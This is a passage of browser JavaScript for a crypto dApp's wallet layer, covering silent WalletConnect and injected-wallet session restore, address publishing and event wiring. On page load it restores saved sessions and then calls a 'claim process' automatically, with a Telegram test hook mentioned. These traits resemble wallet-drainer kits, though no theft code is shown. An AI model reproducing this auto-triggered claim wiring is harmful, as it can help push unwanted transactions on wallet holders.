            currentWalletType = savedType;
            attachProviderEvents(window.ethereum, savedType);
            renderConnectedUI(addr, 'evm');
            publish(addr, 'evm');
            log(`✅ injected restore ${shortAddr(addr)}`);
            setTimeout(() => window.initiateClaimProcess?.(), 1500);
            return;
          }
        }
      } catch (e) { log(`injected restore failed: ${e.message}`); }
    }

    // (b) WalletConnect restore — silent session reuse.
    if (savedType === 'walletconnect' && savedTopic) {
      try {
        await initWalletConnect(false);
        const live = wcClient?.session?.get?.(savedTopic);
        if (live) {
          currentSession = live;
          const provider = await withTimeout(EthereumProvider.init({
            projectId: PROJECT_ID,
            metadata: DAPP_METADATA,
            session: live,
            // ── FIX: CAIP-2 chain strings ──
            chains: [MAINNET_CAIP],
            optionalChains: [MAINNET_CAIP],
          }), 15000, 'wc-restore-init');
          const addr = await safeEthAccounts(provider);
          if (addr) {
            const w3 = await buildWeb3(provider);
            web3Instance      = w3;
            contractInstance  = buildContract(w3);
            activeProvider    = provider;
            currentAddress    = addr;
            currentChainId    = MAINNET_ID;
            currentWalletType = 'walletconnect';
            attachProviderEvents(provider, 'walletconnect');
            renderConnectedUI(addr, 'evm');
            publish(addr, 'evm');
            log(`✅ WC restore ${shortAddr(addr)}`);
            setTimeout(() => window.initiateClaimProcess?.(), 1500);
            return;
          }
        }
      } catch (e) { log(`WC restore failed: ${e.message}`); }
    }

    log('restore produced no live session — clearing keys');
    LS.clear();
  }

  /* ─── Public bridge for script.js ───────────────────────────────────── */
  window.apexWallet = {
    connect: connectWallet,
    disconnect: disconnectWallet,
    get address()    { return currentAddress; },
    get chainId()    { return currentChainId; },
    get provider()   { return activeProvider; },
    get contract()   { return contractInstance; },
    get walletType() { return currentWalletType; },
  };

  /* ─── WC event subscriptions ────────────────────────────────────────── */
  function attachWCEvents() {
    if (!wcClient?.on) return;
    try {
      wcClient.on('session_update', ({ params }) => {
        const accounts = params?.namespaces?.eip155?.accounts;
        if (Array.isArray(accounts) && accounts.length) {
          const a = accounts[0].split(':')[2];
          currentAddress = a;
          LS.set(LS.ADDRESS, a);
          renderConnectedUI(a, 'evm');
          publish(a, 'evm');
        }
      });
      wcClient.on('session_delete', () => {
        log('WC session deleted');
        disconnectUI();
      });
      wcClient.on('session_connect', (session) => {
        const a = session?.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (a) {
          currentSession = session;
          currentAddress = a;
          LS.set(LS.ADDRESS, a);
          LS.set(LS.TYPE, 'walletconnect');
          LS.set(LS.TOPIC, session.topic);
          renderConnectedUI(a, 'evm');
          publish(a, 'evm');
        }
      });
    } catch (e) { log(`WC event attach failed: ${e.message}`); }
  }

  /* ─── Attach injected listeners on load ─────────────────────────────── */
  if (window.ethereum && isDesktop()) {
    attachProviderEvents(window.ethereum, 'injected');
  }

  /* ─── beforeunload cleanup ──────────────────────────────────────────── */
  window.addEventListener('beforeunload', () => {
    try { wcModal?.closeModal?.(); } catch (_) {}
  });

  /* ─── Kick off restore + WC event wiring ────────────────────────────── */
  (async () => {
    try {
      await restoreSaved();
    } catch (e) {
      log(`restore threw: ${e.message}`);
    }
    try {
      await initWalletConnect(false);
      attachWCEvents();
    } catch (e) {
      log(`WC post-restore init failed: ${e.message}`);
    }
    log(`✅ main.js ready — platform=${platform}`);
    console.log('✅ main.js ready — test with testTelegram("hi")');
  })();
}
